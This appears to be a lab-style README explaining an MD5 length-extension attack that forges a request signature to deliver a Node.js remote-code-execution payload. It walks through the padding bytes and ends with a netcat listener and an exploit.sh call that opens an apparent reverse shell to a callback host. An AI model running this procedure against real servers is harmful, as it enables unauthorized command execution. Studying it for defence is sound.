# MD5_Hash_Extender_Attack_Case_Study
This repo shows a case by using MD5 hash extender atttack

Assumptions:  
(1) Assume the signature algorithm on a web app is calculated to be sig=md5hash(api_key|payload).  
If we know the api_key, then we can send the customized payload with its correspnding signature to the web server.  
(2) Assume the web server accepts node js payload, which allows remote command execution with a known api_key. The server accepts the payload as the JSON by POST method.  
```
{"sig":"SOME_MD5HASH","code":"SOME_NODE_JS_PAYLOAD"}
```

## Challenge: what if we don't know the api_key? Can we successfully send the node js RCE paylod to the web server?  

## Solution IDEA: MD5 Hash Extender Attack  

Given the folowings, we can still send the node js RCE payload to the web server even without knowing the api_key.  
### (1) The ini_payload in ini_payload.txt  
- `cat ini_payload.txt`  
```
function hello(name) {
  return 'Hello ' + name + '!';
}

hello('World'); // should print 'Hello World'
```

### (2) The initial signature of the unknown api_key and the ini_payload  
```
md5hash(api_key|ini_payload) = aaa8111b4871b48dc6c0ac4c33ef9e1b  
```

### (3) Given an example api_key as follows, which shows the length of the api_key is 36.  
```d0fd6398-2254-440a-8405-ebaf7cb7cb5d```  
Thus, the total payload length for the unknown api_key and the ini_payload will be  
`echo -n "d0fd6398-2254-440a-8405-ebaf7cb7cb5d|$(cat cmd_default.txt)" | wc -c`  
(Don't forget the character `|` in the signature algorithm.  )
```
140
```

## Procedures of the solution:
Reference: https://github.com/iagox86/hash_extender

### Step (0): Read and understand how MD5 Hash Exterder attack works from the reference above

### Step (1): Get the PADDING bytes and the SIZE_DATA bytes  
There are 140 bytes DATA for the md5 hash function, which means 140*8 = 1120 bits => 0x0460 in hex.  
This means that (64-8) - (140 mod 64) = 44 bytes of paddings (1 at the leading bit and all other zeros) such that  
```
\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00
```
We also have the 8-byte little-endian length field:  
```
\x60\x04\x00\x00\x00\x00\x00\x00
```
Then, we have 140 bytes DATA + 44 bytes PADDING + 8 bytes SIZE_DATA, this results as total 140+44+8 = 192 bytes in the buffer in the exploit.  

### Step (2): Get the signature that has the append_payload based on the unknown api_key and the ini_payload with the algorithm of md5 hash  
The signature of the append_payload can be calcualted by pushing the new data into the buffer that contains 192 byts above in the exploit.  

### Step (3): Customize the append_payload. The append_payload POSTed to the serve contains the ini_payload, the PADDING of ini_payload, and the new command. We do not include the 8 byte SIZE_DATA since the server will calculate the final size of append_payload itself.

### Step (4): With the new signature and the append_payload, we can then send those in JSON format by POST method to the server to trigger RCE. There is an example exploit.sh written in bash and C in this repo.
```
chmod +x exploit.sh

nc -nvlp 443

./exploit.sh 192.168.207.153 8000 192.168.49.207 443
```



